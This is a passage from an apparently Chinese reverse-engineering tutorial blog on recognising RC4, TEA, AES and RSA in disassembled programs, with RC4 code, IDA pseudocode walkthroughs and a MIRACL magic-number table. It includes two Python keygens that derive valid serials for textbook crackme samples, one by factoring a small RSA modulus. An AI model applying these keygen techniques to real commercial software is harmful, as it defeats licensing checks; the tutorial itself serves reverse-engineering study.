class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> S[<span class="number">256</span>] = &#123; <span class="number">0</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">swap</span><span class="params">(<span class="keyword">int</span>&amp; a, <span class="keyword">int</span>&amp; b)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> c = a;</span><br><span class="line">a = b;</span><br><span class="line">b = c;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">KSA</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> key[], <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) S[i] = i;</span><br><span class="line"><span class="keyword">int</span> j = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">j = (j + S[i] + key[i % len]) % <span class="number">256</span>;</span><br><span class="line">swap(S[i], S[j]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">PRGA</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">char</span> data[], <span class="keyword">int</span> len)</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> i = <span class="number">0</span>, j = <span class="number">0</span>, num = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> data_length = len;</span><br><span class="line"><span class="keyword">while</span> (data_length--) &#123;</span><br><span class="line">i = (i + <span class="number">1</span>) % <span class="number">256</span>;</span><br><span class="line">j = (j + S[i]) % <span class="number">256</span>;</span><br><span class="line">swap(S[i], S[j]);</span><br><span class="line"><span class="keyword">int</span> t = (S[i] + S[j]) % <span class="number">256</span>;</span><br><span class="line"><span class="keyword">int</span> k = S[t];</span><br><span class="line">data[num] = (data[num] ^ k);</span><br><span class="line">num++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> key[] = <span class="string">"xwdidi.com"</span>;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> data[] = <span class="string">"bbspediycom"</span>;</span><br><span class="line">KSA(key, <span class="built_in">strlen</span>((<span class="keyword">char</span>*)key));</span><br><span class="line">PRGA(data,<span class="built_in">strlen</span>((<span class="keyword">char</span>*)data));</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>((<span class="keyword">char</span>*)data); i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; hex &lt;&lt; (<span class="keyword">int</span>)data[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="初探逆向识别RC4"><a href="#初探逆向识别RC4" class="headerlink" title="初探逆向识别RC4"></a>初探逆向识别RC4</h4><p>使用加密与解密中的<code>RC4Sample</code>进行分析学习.</p><h5 id="主函数体伪代码"><a href="#主函数体伪代码" class="headerlink" title="主函数体伪代码"></a>主函数体伪代码</h5><p><img src="https://i.loli.net/2019/11/08/uZfmi92SpsNJxzw.png" alt="image.png">中间两个函数可能就是<code>KSA</code>和<code>PGRA</code>.</p><h5 id="sub-401000"><a href="#sub-401000" class="headerlink" title="sub_401000"></a>sub_401000</h5><p>伪代码全图:<img src="https://i.loli.net/2019/11/08/DYdUStKxr1M3skF.png" alt="image.png"></p><p>可以看中间<code>do-while</code>循环,有一个数组的<code>256</code>位初始化.说明<code>a1+2</code>是一个数组<code>s-box</code>的位置,那么<code>*a1</code>和<code>a1[0]</code>就是两个<code>int</code>型变量.然后下面的循环中,其实是交换和计算<code>j</code>是交叉在一起的.<code>31,32,35,36</code>是计算<code>j</code>的位置,<code>30,33,34</code>是交换.</p><p>通过<code>v3</code>与<code>a3</code>比较,获得对key长度取余的效果.<code>v8</code>则是每循环一次加一取值的<code>s-box</code>.</p><h5 id="sub-401070"><a href="#sub-401070" class="headerlink" title="sub_401070"></a>sub_401070</h5><p><img src="https://i.loli.net/2019/11/08/l7myjeTzdI4acxB.png" alt="image.png"></p><p>第一眼会发现做了异或操作,可能这就是<code>PRGA</code>.</p><p>仔细观察后发现<code>result[2]</code>其实是<code>s-box</code>的首地址,其他变量的话就是相对首地址的偏移.<code>30,31,34,35,36</code>其实交换函数.其他就是获得异或key所需的偏移计算.</p><h4 id="魔改RC4"><a href="#魔改RC4" class="headerlink" title="魔改RC4"></a>魔改RC4</h4><ol><li>使用其它算法对参数进行加密,与其他加密算法糅合.</li><li>S盒的内部数据固定</li></ol><h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>对于循环,又有<code>256</code>或者<code>0x100</code>的关键字,获取字符串长度,又再次使用处理过的值进行异或的话可以去怀疑是<code>RC4</code>加密.</p><h3 id="TEA"><a href="#TEA" class="headerlink" title="TEA"></a>TEA</h3><p><code>xtea</code>,<code>xxtea</code>,<code>tea</code>都可以用<code>0x9E3779B9</code>识别,详细分析后面有空再写吧</p><h3 id="AES"><a href="#AES" class="headerlink" title="AES"></a>AES</h3><h4 id="基本原理-1"><a href="#基本原理-1" class="headerlink" title="基本原理"></a>基本原理</h4><p>分组长度:128比特</p><p>密钥长度:128, 192, 256比特</p><p>圈数:分别为10, 12, 14</p><p>设定Nr为第<code>r+1</code>次轮函数. 将输入复制到状态数组中.在进行一个初始轮密钥加操作之后, 执行<code>Nr</code>次论函数.对状态数组进行变换, 其中最后一轮不同于前Nr-1 轮. 将最终的状态数组复制到输出数组中. 即得到最终密文(引用自加密与解密)</p><p>AES-128:</p><p><img src="https://i.loli.net/2019/11/22/C3fsQh5vOduUnaw.png" alt="image.png"></p><p>轮密钥加(AddRoundKey):将状态元素与轮密钥进行简单的异或计算,唯一需要三个参数的过程.</p><p>字节替代(SubBytes):使用<code>S-box</code>进行查表,字节替换操作。</p><p><code>S-box</code>:</p><p><img src="https://i.loli.net/2019/11/20/vJHrkdItu4gyxzV.png" alt="image.png"></p><p>行位移(ShiftRows):数组大小为<code>4x4字节</code>,第一行保持不变,第二行循环左移1字节,第三行循环左移2字节,第四行循环左移3字节.</p><p>列混淆(MixColumns):以列为单位,可看作进行矩阵乘法,矩阵为((02,03,01,01)(01,02,03,01)(01,01,02,03)(03,01,01,02))</p><p>密钥扩展(KeyExpansion):通过密码扩展算法生成<code>Nr+1</code>个32位双字</p><p>解密就是逆过程了</p><h5 id="空间换时间"><a href="#空间换时间" class="headerlink" title="空间换时间"></a>空间换时间</h5><p>大多数时候,常见aes使用空间换时间</p><p>将轮函数的几个步骤合并为一组简单的查表操作,只是最后一步没有,需要使用常规方法处理.</p><p>然后需要4个<code>T</code>表，一个<code>T</code>表需要256个4字节的32位双字，所以需要<code>4kb</code>的存储空间.</p><p>每进行一轮,4次查表,4轮异或运算.一共有四次,16轮查表,16轮异或</p><p>T表数据图</p><p><img src="https://ask.qcloudimg.com/http-save/yehe-1268449/i58cakumz6.jpeg?imageView2/2/w/1620" alt="img"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">t0 = Te0[s0 &gt;&gt; <span class="number">24</span>] ^ Te1[(s1 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>] ^ Te2[(s2 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>] ^ Te3[s3 &amp; <span class="number">0xff</span>] ^ rk[round*<span class="number">4</span>];</span><br><span class="line">t1 = Te0[s1 &gt;&gt; <span class="number">24</span>] ^ Te1[(s2 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>] ^ Te2[(s3 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>] ^ Te3[s0 &amp; <span class="number">0xff</span>] ^ rk[round*<span class="number">4</span>+<span class="number">1</span>]; </span><br><span class="line">t2 = Te0[s2 &gt;&gt; <span class="number">24</span>] ^ Te1[(s3 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>] ^ Te2[(s0 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>] ^ Te3[s1 &amp; <span class="number">0xff</span>] ^ rk[round*<span class="number">4</span>+<span class="number">2</span>]; </span><br><span class="line">t3 = Te0[s3 &gt;&gt; <span class="number">24</span>] ^ Te1[(s0 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xff</span>] ^ Te2[(s1 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff</span>] ^ Te3[s2 &amp; <span class="number">0xff</span>] ^ rk[round*<span class="number">4</span>+<span class="number">3</span>];</span><br></pre></td></tr></table></figure><h4 id="逆向初探识别RSA"><a href="#逆向初探识别RSA" class="headerlink" title="逆向初探识别RSA"></a>逆向初探识别RSA</h4><p>一样使用的是加密与解密中的样例</p><ol><li><p><code>FindCrypt</code>识别处<code>MD5</code>和<code>AES</code><img src="https://i.loli.net/2019/11/19/Ovp4mEYTeIQlCoP.png" alt="image.png"></p></li><li><p><code>Serial</code>长度为32字节，使用16进制的话刚好为128位。<img src="https://i.loli.net/2019/11/20/uTNLphOHUxqy3kS.png" alt="image.png"></p></li><li><p>静态分析大概这样，接下来动态看看<img src="https://i.loli.net/2019/11/20/TB6O27oxGh5dsFi.png" alt="image.png"></p></li><li><p><code>sub_401320</code>压入初始化后的寄存器数组地址，<code>name</code>, 长度<img src="https://i.loli.net/2019/11/20/Uhi4f7Ir9Qsdueo.png" alt="image.png"></p></li><li><p>最终获得128位<code>MD5</code>散列值<img src="https://i.loli.net/2019/11/20/NSD2sLzbZOxemBU.png" alt="image.png"></p></li><li><p>执行<code>sub_401EC0</code></p><p><img src="https://i.loli.net/2019/11/20/1nkTwzciLpbDM9a.png" alt></p></li><li><p>内存中的<code>sbox</code></p><p><img src="https://i.loli.net/2019/11/21/7O5cwBhmPLNMjXJ.png" alt="image.png"></p></li><li><p>细致算法省略</p><p><img src="https://i.loli.net/2019/11/21/dRSnO8PBKqxHvLt.png" alt="image.png">函数中存在大量的移位异或操作,太大了就不截图了.</p></li><li><p>注册机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">   <span class="comment">#!python3</span></span><br><span class="line">   <span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line">   <span class="comment">#"xwdidi" md5</span></span><br><span class="line">   hash = <span class="string">b"\x39\xd7\x8e\xe5\x67\xf3\xf2\x96\xad\x84\x8d\x3f\xcd\xb1\xd4\x61"</span></span><br><span class="line">   key = <span class="string">b"\x2b\x7e\x15\x16\x28\xae\xd2\xa6\xab\xf7\x15\x88\x09\xcf\x4f\x3c"</span></span><br><span class="line">   cipher = AES.new(key,AES.MODE_ECB)</span><br><span class="line">   plaintext = cipher.decrypt(hash)</span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> plaintext:</span><br><span class="line">   print(hex(i)[<span class="number">2</span>:].upper(),end=<span class="string">""</span>)</span><br></pre></td></tr></table></figure></li></ol><h4 id="加密模式与填充模式"><a href="#加密模式与填充模式" class="headerlink" title="加密模式与填充模式"></a>加密模式与填充模式</h4><ul><li>ECB: 需要加密的消息按照块密码的块大小被分为数个块，并对每个块进行独立加密。</li><li>CBC : 每 个明文块先与前一个密文块进行异或后，再进行加密   </li><li>CTR</li><li>OCF</li><li>CFB</li></ul><p>ECB 与 CBC</p><ul><li><p>PKCS7Padding: 假设数据长度需要填充n(n&gt;0)个字节才对齐，那么填充n个字节，每个字节都是n;如果数据本身就已经对齐了，则填充一块长度为块大小的数据，每个字节都是块大小。</p></li><li><p>PKCS5Padding:PKCS7Padding的子集，块大小固定为8字节</p></li><li><p>Zero-Padding  用0填充(适合以\ 0结尾的字符串加解密)</p></li></ul><h2 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h2><h3 id="RSA"><a href="#RSA" class="headerlink" title="RSA"></a>RSA</h3><h4 id="基本原理-2"><a href="#基本原理-2" class="headerlink" title="基本原理"></a>基本原理</h4><ol><li><p>选择两个不同大的质数<code>p</code>和<code>q</code>,计算<code>n=p*q</code></p></li><li><p>根据欧拉函数,求得<code>r=φ(n)=φ(p)φ(q)=(p−1)(q−1)</code></p></li><li><p>选择一个与<code>e</code>互质且小于<code>r</code>的整数,并求得c关于r的模反元素,命名为<code>d</code>,有<code>ed ≡ 1 mod r</code></p></li><li><p>销毁<code>p</code>和<code>q</code>,此时<code>(n,e)</code>为公钥,<code>(n,d)</code>为私钥</p></li><li><p>$$<br>加密<br>加密 n^e ≡ c \bmod N,消息解密c^d ≡ n \bmod N \<br>(只需要证明n^{ed} ≡n\bmod N即可)<br>$$</p></li></ol><h4 id="逆向初探RSA"><a href="#逆向初探RSA" class="headerlink" title="逆向初探RSA"></a>逆向初探RSA</h4><p>发现这个程序和书前文使用<code>Miracl</code>库运算的逻辑相同,那也简单分析一下.</p><p><img src="https://i.loli.net/2019/11/16/vksbYIzRtKOaNPe.png" alt="image.png"></p><ol><li><p><img src="https://i.loli.net/2019/11/22/T5VRyDKz1ColtGf.png" alt="image.png">    </p><p>逐一检测数据是否为<code>0123456789abcdeABCDEF</code>中的数据,如果有则直接报错</p></li><li><p><img src="https://i.loli.net/2019/11/17/o4hv5SKQTUxgi3H.png" alt="image.png"></p><p>参数初始化</p></li><li><p><img src="https://i.loli.net/2019/11/17/E5LKI4xsmPi7C16.png" alt="image.png"></p><p>传入<code>Serial</code>赋值m,大数<code>n</code>和<code>e</code></p></li><li><p><img src="https://i.loli.net/2019/11/17/gUSmdG7KrR6jJxe.png" alt="image.png"></p><p>计算取模</p></li><li><p><img src="https://i.loli.net/2019/11/17/P4TaxJWlbgekjM5.png" alt="image.png"></p><p>比较判断是否正确</p></li><li><p>由此我们可知是将serial进行RSA解密与输入进行比较.得知了<code>n=0x80C07AFC9D25404D6555B9ACF3567CF1</code>和<code>e=0x10001</code></p></li><li><p>使用大数分解<code>RSATool</code>的<code>Factor N</code>功能,得到<code>p=0xA554665CC62120D3</code>,<code>q=0xC75CB54BEDFA30AB</code></p></li><li><p>输入<code>E</code>,点击<code>Calc. D</code>得到<code>d=0x651A40B9739117EF505DBC33EB8F442D</code></p></li><li><p><code>xwdidi</code>的16进制为<code>787764696469</code>,使用大叔计算器进行<code>c ^d ≡ m mod  N</code>计算,最后得到<code>m=0x5D99FFF7B67285275C8639BCEF982B7</code> ,带入软件后返回<code>Success!</code></p></li><li><p>注册机</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">#!python3</span></span><br><span class="line">    <span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">    c =input()</span><br><span class="line">a = <span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> c:</span><br><span class="line">    a = a + hex(ord(i))</span><br><span class="line">        </span><br><span class="line">    <span class="comment"># print(a)</span></span><br><span class="line">    a = a.replace(<span class="string">"0x"</span>,<span class="string">""</span>)</span><br><span class="line">    e = <span class="string">"0x"</span> + a</span><br><span class="line">    <span class="comment"># print(e)</span></span><br><span class="line">    result  =  pow(eval(e),<span class="number">0x651A40B9739117EF505DBC33EB8F442D</span>,<span class="number">0x80C07AFC9D25404D6555B9ACF3567CF1</span>)</span><br><span class="line">    print(hex(result)[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure></li></ol><ol start="11"><li>powmod函数的部分伪代码作为参考<img src="https://i.loli.net/2019/11/17/kn7zr5GxJIQORLD.png" alt="image.png"></li></ol><h3 id="Mircal大数运算库"><a href="#Mircal大数运算库" class="headerlink" title="Mircal大数运算库"></a>Mircal大数运算库</h3><p>Mircal库过于常用,需要进一步的熟悉才能更加利于分析.</p><p>头文件有<code>mircal.h</code>和<code>mirdef.h</code>两者,库文件为<code>ms32.lib</code></p><p>以下是大数运算库函数的<code>Magic number</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br></pre></td><td class="code"><pre><span class="line">MIRACL MAGIC NUMBERS TABLE:</span><br><span class="line">                       by bLaCk-eye </span><br><span class="line">from an original ideea by bF!^k23</span><br><span class="line">        Modified by cnbragon for miracl v5.01</span><br><span class="line">        </span><br><span class="line">NUMBER OF FUNCTIONS:96h</span><br><span class="line"></span><br><span class="line">innumequ 01h .</span><br><span class="line">otnumequ 02h .</span><br><span class="line">jackequ 03h .</span><br><span class="line">normaliseequ 04h .</span><br><span class="line">multiplyequ 05h .</span><br><span class="line">divideequ 06h .</span><br><span class="line">increqu 07h .</span><br><span class="line">decrequ 08h .</span><br><span class="line">premultequ 09h .</span><br><span class="line">subdivequ 0Ah .</span><br><span class="line">fdsizeequ 0Bh .</span><br><span class="line">egcdequ 0Ch .</span><br><span class="line">cbaseequ 0Dh .</span><br><span class="line">cinnumequ 0Eh .</span><br><span class="line">cotnumequ 0Fh .</span><br><span class="line">nrootequ 10h .</span><br><span class="line">powerequ 11h .</span><br><span class="line">powmodequ 12h .</span><br><span class="line">bigdigequ 13h .</span><br><span class="line">bigrandequ 14h .</span><br><span class="line">nxprimeequ 15h .</span><br><span class="line">isprimeequ 16h .</span><br><span class="line">mirvarequ 17h .</span><br><span class="line">mad    equ 18h.</span><br><span class="line">multi_inverseequ 19h .</span><br><span class="line">putdigequ 1Ah .</span><br><span class="line">add    equ 1Bh .</span><br><span class="line">subtractequ 1Ch .</span><br><span class="line">mirsysequ 1Dh .</span><br><span class="line">xgcdequ 1Eh .</span><br><span class="line">fpackequ 1Fh .</span><br><span class="line">dconvequ 20h .</span><br><span class="line">mr_shiftequ 21h .</span><br><span class="line">mroundequ 22h .</span><br><span class="line">fmulequ 23h .</span><br><span class="line">fdivequ 24h .</span><br><span class="line">faddequ 25h .</span><br><span class="line">fsubequ 26h .</span><br><span class="line">fcompequ 27h .</span><br><span class="line">fconvequ 28h .</span><br><span class="line">frecipequ 29h .</span><br><span class="line">fpmulequ 2Ah .</span><br><span class="line">fincrequ 2Bh .</span><br><span class="line">;null entry</span><br><span class="line">ftruncequ 2Dh .</span><br><span class="line">frandequ 2Eh .</span><br><span class="line">sftbitequ 2Fh .</span><br><span class="line">buildequ 30h .</span><br><span class="line">logb2equ 31h .</span><br><span class="line">expintequ 32h .</span><br><span class="line">fpowerequ 33h .</span><br><span class="line">frootequ 34h .</span><br><span class="line">fpi    equ 35h .</span><br><span class="line">fexpequ 36h .</span><br><span class="line">flogequ 37h .</span><br><span class="line">fpowfequ 38h .</span><br><span class="line">ftanequ 39h .</span><br><span class="line">fatanequ 3Ah .</span><br><span class="line">fsinequ 3Bh .</span><br><span class="line">fasinequ 3Ch .</span><br><span class="line">fcosequ 3Dh .</span><br><span class="line">facosequ 3Eh .</span><br><span class="line">ftanhequ 3Fh .</span><br><span class="line">fatanhequ 40h .</span><br><span class="line">fsinhequ 41h .</span><br><span class="line">fasinhequ 42h .</span><br><span class="line">fcoshequ 43h .</span><br><span class="line">facoshequ 44h .</span><br><span class="line">flopequ 45h .</span><br><span class="line">gprimeequ 46h .</span><br><span class="line">powltrequ 47h .</span><br><span class="line">fft_multequ 48h .</span><br><span class="line">crt_initequ 49h .</span><br><span class="line">crt    equ 4Ah .</span><br><span class="line">otstrequ 4Bh .</span><br><span class="line">instrequ 4Ch .</span><br><span class="line">cotstrequ 4Dh .</span><br><span class="line">cinstrequ 4Eh .</span><br><span class="line">powmod2equ 4Fh .</span><br><span class="line">prepare_montyequ 50h .</span><br><span class="line">nresequ 51h .</span><br><span class="line">redcequ 52h .</span><br><span class="line">nres_modmultequ 53h .</span><br><span class="line">nres_powmodequ 54h .</span><br><span class="line">nres_moddivequ 55h .</span><br><span class="line">nres_powltrequ 56h .</span><br><span class="line">divisibleequ 57h .</span><br><span class="line">remainequ 58h .</span><br><span class="line">fmoduloequ 59h .</span><br><span class="line">nres_modaddequ 5Ah .</span><br><span class="line">nres_modsubequ 5Bh .</span><br><span class="line">nres_negateequ 5Ch .</span><br><span class="line">ecurve_initequ 5Dh .</span><br><span class="line">ecurve_addequ 5Eh .</span><br><span class="line">ecurve_multequ 5Fh .</span><br><span class="line">epoint_initequ 60h .</span><br><span class="line">epoint_setequ 61h .</span><br><span class="line">epoint_getequ 62h .</span><br><span class="line">nres_powmod2equ 63h .</span><br><span class="line">nres_sqrootequ 64h .</span><br><span class="line">sqrootequ 65h </span><br><span class="line">nres_premultequ 66h .</span><br><span class="line">ecurve_mult2equ 67h .</span><br><span class="line">ecurve_subequ 68h .</span><br><span class="line">trial_divisionequ 69h .</span><br><span class="line">nxsafeprimeequ 6Ah .</span><br><span class="line">nres_lucasequ 6Bh .</span><br><span class="line">lucasequ 6Ch .</span><br><span class="line">brick_initequ 6Dh .</span><br><span class="line">pow_brickequ 6Eh .</span><br><span class="line">set_user_functionequ 6Fh .</span><br><span class="line">nres_powmodnequ 70h .</span><br><span class="line">powmodnequ 71h .</span><br><span class="line">ecurve_multnequ 72h .</span><br><span class="line">ebrick_initequ 73h .</span><br><span class="line">mul_brickequ 74h .</span><br><span class="line">epoint_normequ 75h .</span><br><span class="line">nres_multi_inverseequ 76h .</span><br><span class="line">;null entry</span><br><span class="line">nres_dotprodequ 78h .</span><br><span class="line">epoint_negateequ 79h .</span><br><span class="line">ecurve_multi_addequ 7Ah .</span><br><span class="line">ecurve2_initequ 7Bh .</span><br><span class="line">epoint2_initequ 7Ch</span><br><span class="line">epoint2_setequ 7Dh .</span><br><span class="line">epoint2_normequ 7Eh .</span><br><span class="line">epoint2_getequ 7Fh .</span><br><span class="line">epoint2_compequ 80h .</span><br><span class="line">ecurve2_addequ 81h .</span><br><span class="line">epoint2_negateequ 82h .</span><br><span class="line">ecurve2_subequ 83h .</span><br><span class="line">ecurve2_multi_addequ 84h .</span><br><span class="line">ecurve2_multequ 85h .</span><br><span class="line">ecurve2_multnequ 86h .</span><br><span class="line">ecurve2_mult2equ 87h .</span><br><span class="line">ebrick2_initequ 88h .</span><br><span class="line">mul2_brickequ 89h .</span><br><span class="line">prepare_basisequ 8Ah .</span><br><span class="line">strong_bigrandequ 8Bh .</span><br><span class="line">bytes_to_bigequ 8Ch .</span><br><span class="line">big_to_bytesequ 8Dh .</span><br><span class="line">set_io_buffer_sizeequ 8Eh .</span><br><span class="line">epoint_getxyz       equ 8Fh .</span><br><span class="line">ecurve_double_add   equ 90h .</span><br><span class="line">nres_double_inverse equ 91h .</span><br><span class="line">double_inverse      equ 92h .</span><br><span class="line">epoint_x            equ 93h .</span><br><span class="line">hamming             equ 94h .</span><br><span class="line">expb2               equ 95h .</span><br><span class="line">bigbits             equ 96h .</span><br></pre></td></tr></table></figure><h4 id="反汇编识别"><a href="#反汇编识别" class="headerlink" title="反汇编识别"></a>反汇编识别</h4><p>反汇编识别着重在于查看函数内部的<code>mov     doword ptr [eax+ecx*4+20], yy</code>格式的反汇编代码,yy即为<code>magic number</code></p><p><img src="https://i.loli.net/2019/11/17/dHEM5beyFUzDIZv.png" alt="image.png"></p><p>这是函数对比图</p><h5 id="sub-401730"><a href="#sub-401730" class="headerlink" title="sub_401730"></a>sub_401730</h5><p><img src="https://i.loli.net/2019/11/17/8tm1rRfjHlNGXbE.png" alt="image.png"></p><h5 id="sub-403BD0"><a href="#sub-403BD0" class="headerlink" title="sub_403BD0"></a>sub_403BD0</h5><p><img src="https://i.loli.net/2019/11/17/zS7xgf5evAr4dRG.png" alt="image.png"></p><p>其他的就不一一找了,都在函数内部都能看见.基本上是这样去识别.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><strong>&lt;&lt;加密与解密4</strong>&gt;&gt;</p><p><a href="https://www.cnblogs.com/gambler/p/9075415.html" target="_blank" rel="noopener">https://www.cnblogs.com/gambler/p/9075415.html</a></p><p><a href="http://dyf.ink/reverse/Identify-Encode-Encryption/introduction/" target="_blank" rel="noopener">http://dyf.ink/reverse/Identify-Encode-Encryption/introduction/</a></p><p><a href="https://xz.aliyun.com/t/5644" target="_blank" rel="noopener">https://xz.aliyun.com/t/5644</a></p><p><a href="https://www.zhihu.com/question/36306744" target="_blank" rel="noopener">https://www.zhihu.com/question/36306744</a></p><p><a href="https://bbs.pediy.com/thread-251248.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-251248.htm</a></p><p><a href="http://dyf.ink/crypto/asymmetric/rsa/rsa_theory/" target="_blank" rel="noopener">http://dyf.ink/crypto/asymmetric/rsa/rsa_theory/</a></p><p><a href="https://www.kancloud.cn/kancloud/rsa_algorithm/48484" target="_blank" 